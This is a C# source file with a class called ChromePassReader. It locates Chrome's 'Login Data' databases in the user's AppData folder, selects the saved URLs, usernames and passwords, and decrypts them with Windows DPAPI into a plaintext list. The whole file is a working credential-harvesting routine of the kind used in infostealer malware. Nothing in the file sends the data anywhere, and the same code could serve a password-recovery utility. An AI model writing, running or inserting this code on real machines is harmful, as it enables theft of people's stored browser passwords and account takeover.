using System;
using System.Data.SQLite;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using System.Collections.Generic;
using System.Linq;

namespace BrowserPass
{
    /// <summary>
    /// http://raidersec.blogspot.com/2013/06/how-browsers-store-your-passwords-and.html#chrome_decryption
    /// </summary>
    class ChromePassReader : IPassReader
    {
        public string BrowserName { get { return "Chrome"; } }

        private const string LOGIN_DATA_PATH = "\\..\\Local\\Google";//\\Chrome\\User Data";//\\Default\\Login Data";

        
        public IEnumerable<CredentialModel> ReadPasswords()
        {
            var result = new List<CredentialModel>();
            var appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);// APPDATA
            var p = Path.GetFullPath(appdata + LOGIN_DATA_PATH);

            var extensions = new List<string> { "." };// ".txt", ".xml" };
            string[] files = Directory.GetFiles(p, "Login Data.*", SearchOption.AllDirectories).ToArray();
            // .Where(f => extensions.IndexOf(Path.GetExtension(f)) >= 0).ToArray();

            int i = 1;
            foreach (var file in files)
            {
                if (File.Exists(file))
                {
                    using (var conn = new SQLiteConnection($"Data Source={file};"))
                    {
                        conn.Open();
                        using (var cmd = conn.CreateCommand())
                        {//SELECT action_url, username_value, password_value FROM logins
                            cmd.CommandText = "SELECT action_url, username_value, password_value FROM logins";
                            using (var reader = cmd.ExecuteReader())
                            {

                                if (reader.HasRows)
                                {
                                    while (reader.Read())
                                    {
                                        try
                                        {
                                            //Decrypt the data using DataProtectionScope.CurrentUser.
                                            var pass = Encoding.UTF8.GetString(ProtectedData.Unprotect(GetBytes(reader,2), null, DataProtectionScope.CurrentUser));

                                            result.Add(new CredentialModel()
                                            {
                                                Url = reader.GetString(0),
                                                Username = reader.GetString(1),
                                                Password = pass//(i++) + ""
                                            });
                                        }
                                        catch (CryptographicException e)
                                        {
                                           // Console.WriteLine("Data was not decrypted. An error occurred.");
                                           // Console.WriteLine(e.ToString());
                                            result.Add(new CredentialModel()
                                            {
                                                Url = reader.GetString(0),
                                                Username = reader.GetString(1),
                                                Password = "!!!Data was not decrypted."
                                            });
                                        }
                                    }
                                }
                            }
                        }
                        conn.Close();
                    }

                }
                else
                {
                    //throw new FileNotFoundException("Canno find chrome logins file");
                }
            }
            return result;
        }

        private byte[] GetBytes(SQLiteDataReader reader, int columnIndex)
        {
            const int CHUNK_SIZE = 2 * 1024;
            byte[] buffer = new byte[CHUNK_SIZE];
            long bytesRead;
            long fieldOffset = 0;
            using (MemoryStream stream = new MemoryStream())
            {
                while ((bytesRead = reader.GetBytes(columnIndex, fieldOffset, buffer, 0, buffer.Length)) > 0)
                {
                    stream.Write(buffer, 0, (int)bytesRead);
                    fieldOffset += bytesRead;
                }
                return stream.ToArray();
            }
        }        
    }



}
